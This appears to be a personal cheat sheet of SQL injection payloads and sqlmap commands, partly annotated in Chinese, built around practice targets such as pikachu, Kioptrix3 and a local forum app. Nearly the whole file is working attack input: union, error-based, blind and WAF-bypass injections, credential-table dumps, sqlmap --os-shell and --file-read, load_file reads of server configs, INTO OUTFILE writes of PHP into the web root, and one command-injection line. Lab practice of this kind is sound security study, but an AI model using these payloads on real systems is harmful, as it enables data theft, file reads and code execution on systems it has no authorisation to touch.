pass = '' or '1' = '1';
' or '1' = '1



`http://localhost/wzry/url.php?date=20231012' union SELECT database(),'','','`

`http://localhost/wzry/url.php?date=20231012' union SELECT

(select GROUP_CONCAT(c.COLUMN_NAME )from information_schema.COLUMNS c where

c.TABLE_SCHEMA='game' and c.TABLE_NAME='user'),'','','`


`http://localhost/wzry/url.php?date=20231012'j   union select database(),version(),user(),'`


`http://localhost/bbs/showmessage.php?id=-1 union select 1,2,load_file('D:\\2024\\phpStudy2018\\PHPTutorial\\Apache\\conf\\vhosts.conf'),4`



通过exploit database搜索得知，gallarific的gallery.php页面存在sql注入漏洞
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --dbs
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --tables



sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --search -D gallery -T gallarific_users
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1" --search -D gallery -T dev_accounts


获得gallery数据库下的表名:sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 -p id --level 4 --risk 3 -D gallery --tables --batch
获取dev_accounts表的数据：sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 -p id --level 4 --risk 3 -D gallery -T dev_accounts --dump --batch

`sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' -D jrlt -T users --columns`

`sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' -D jrlt -T users -C name,password --dump`
sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --current-db

sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --sql-shell
sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --password
sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --os-shell
sqlmap -u 'http://192.168.244.1/bbs/showmessage.php?id=2' --file-read "D:\e.txt"

`http://localhost/bbs/showmessage.php?id=1 order by 4
`http://localhost/bbs/showmessage.php?id=-1 union select 1,2,3,4`
`http://localhost/bbs/showmessage.php?id=-1 union select 1,database(),version(),4`
`http://localhost/bbs/showmessage.php?id=-1 union select 1,database(),version(),(select group_concat(schema_name) from information_schema.schemata)
`http://localhost/bbs/showmessage.php?id=-1 union select 1,2,version(),group_concat(schema_name) from information_schema.schemata`

==`==================pikachu手动查询：================================`==


`http://localhost/bbs/showmessage.php?id=-1 /*!union*/ select 1,2,3,(select group_concat(schema_name) from information_schema.schemata)`

`http://localhost/bbs/showmessage.php?id=-1 /*!union*/ select 1,2,3,database/**/()`

`http://localhost/bbs/showmessage.php?id=-1 union select 1,database(),version(),(select group_concat(table_name) from  information_schema.tables where table_schema='jrlt')`


`http://localhost/bbs/showmessage.php?id=-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='users'and table_schema='jrlt'`


`http://localhost/bbs/showmessage.php?id=-1 union  select 1,2,3,concat(name,':',password) from users limit 0,1`


盲注：
kobe' and length(database())<8#
kobe' and ascii(substr(database(),1,1))=112#
kobe' and ascii(substr(database(),1,1))=112 -- +

lucy' and if(length(database())<10,sleep(5),1)#
`sqlmap -u 'http://192.168.2.4/pikachu/vul/sqli/sqli_blind_t.php?name=1&submit=%E6%9F%A5%E8%AF%A2' --current-db` 



admin%'  order by 3#
') union select 1,database()#
宽字节：1%df' union select user(),database()#   --+

=======================================================

`http://localhost/bbs/showmessage.php?id=2 and (select 1 from (select count(*),concat(0x5e,(select version() from information_schema.tables limit 0,1) ,0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)`



0x5e："^"符号的 16 进制,约定俗成，一般给程序使用


==`============报错注入：=====================================`==
获得数据库名字：
username=123' or updatexml(1,concat(0x5e,(select database()),0x5e),1) or'

?id=57%20or%20updatexml(1,concat(0x5e,(select%20user()),0x5e),1)--+


获取数据表名称：
?id=57%20or%20updatexml(1,concat(0x5e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='pikachu'),0x5e),1)--+

获取列名称：
xx' or updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='pikachu'),0x5e),1) or‘
?id=57%20or%20updatexml(1,concat(0x5e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='users'%20and%20table_schema='pikachu'),0x5e),1)--+


根据列表获取内容：
xx‘or updatexml(1,concat(0x5e,(select concat(name,':',password) from users limit

0,1),0x5e),1) or '

?id=57%20or%20updatexml(1,concat(0x5e,(select%20concat(username,':',password)%20from%20users%20limit%200,1),0x5e),1)--+ 



============================================================

' order by 2#
’) union select 1,2#
' union select database(),user()#

admin' and if(1=1,sleep(2),1)#
127.0.0.1;whoami


待测试：

' or (select 1 from (select count(*),concat(0x5e,(select database() from

information_schema.tables limit 0,1) ,0x5e,floor(rand(0)*2))x from

information_schema.tables group by x)a) or'

' or extractvalue(1, concat(0x5c, (select group_concat(table_name) from

information_schema.tables where table_schema='jrlt'),0x5c)) or '

获取字段
' or updatexml(1,concat(0x5e,(select group_concat(column_name) from

information_schema.columns where table_name='users' and table_schema='jrlt'),0x5e),1) or '

获取数据
' or updatexml(1,concat(0x5e,(select concat(name,':',password) from users limit

0,1),0x5e),1) or '







`select floor(rand(14)*2) from information_schema.TABLES;`
`select floor(rand(0)*2) from information_schema.TABLES;`
`SELECT extractvalue('<root><username>luojie</username><age>18</age></root>', '//username');`
 
`SELECT updatexml('<root><username>luojie</username><age>18</age></root>', '//username','<name>luojiejie</name>');`


`http://localhost/bbs/showmessage.php?id=1 and extractvalue(1, concat(0x5c, (select version()),0x5c))`


`http://localhost/bbs/showmessage.php?id=1 and updatexml(1,concat(0x5e,(select version()),0x5e),1)`


`http://localhost/bbs/showmessage.php?id=-5%20union%20select%201,2,3,load_file(%27D:\\phpstudy_pro\\Extensions\\Apache2.4.39\\conf\\vhosts\\0localhost_80.conf%27)`


`/bbs/showmessage.php?id=-1 union select 1,2,3,'<?php phpinfo();?>' into outfile "D:\\phpstudy_pro\\WWW\\test001.php"`


布尔注入
`http://localhost/bbs/showmessage.php?id=2 and ascii(substr(database(),1,1))=107`


`http://localhost/bbs/showmessage.php?id=2 and (select count(table_name) from information_schema.tables where table_schema=database())<2



?id=-1 union select 1,2,3,@@datadir
?id=-1 union select 1,2,3,'<?php phpinfo();?>' into outfile “C:\\Users\\86188\\Desktop\\tool\\phpStudy\\PHPTutorial\\WWW\\bbs\\test.php"



WAF绕过：

`?id=1/**&id=-1% union select 1,2,3,4%23*/`
`?id=1/**&id=-1% union select 1,2,3,database()%23*/`




